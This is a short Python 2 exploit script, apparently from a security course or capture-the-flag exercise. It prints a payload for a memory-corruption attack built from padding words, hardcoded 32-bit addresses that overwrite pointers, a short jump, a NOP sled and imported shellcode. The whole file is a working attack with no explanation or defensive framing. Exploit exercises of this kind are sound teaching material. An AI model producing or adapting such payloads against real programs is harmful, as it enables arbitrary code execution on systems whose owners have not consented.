from shellcode import shellcode
from struct import pack

def main():
	print pack("<I",0xffffffff)*10 + pack("<I",0xbffe9468) + pack("<I",0x080f3718)
	print pack("<I",0xffffffff)*10 + pack("<I",0x080f3718) + pack("<I",0x080f3780)
	print "\xeb\x04" + "\x90"*4 + shellcode

if __name__ == '__main__':
	main()
